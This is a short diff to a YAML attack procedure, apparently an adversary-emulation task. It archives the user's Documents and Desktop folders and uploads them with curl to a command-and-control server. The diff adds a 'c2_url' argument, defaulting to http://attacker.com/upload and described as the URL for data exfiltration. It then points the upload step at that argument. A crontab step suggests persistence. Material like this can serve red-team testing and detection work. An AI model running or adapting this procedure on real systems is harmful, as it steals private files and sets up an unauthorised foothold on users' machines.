@@ -27,6 +27,10 @@ args:
   description: Backup directory path
   type: string
   default: ~/.backup_data
+- name: c2_url
+  description: C2 server URL for data exfiltration
+  type: string
+  default: http://attacker.com/upload
 steps:
 - name: create_backup_directory
   inline: mkdir -p {{ .Args.backup_dir }}
@@ -42,7 +46,7 @@ steps:
     tar -czf "${BACKUP_DIR}/backup_${DATE}.tar.gz" ~/Documents ~/Desktop 2>/dev/null
 
     # Upload to attacker server
-    curl -s -F "file=@${BACKUP_DIR}/backup_${DATE}.tar.gz" http://attacker.com/upload
+    curl -s -F "file=@${BACKUP_DIR}/backup_${DATE}.tar.gz" {{ .Args.c2_url }}
   mode: 493
   cleanup: default
 - name: add_to_crontab
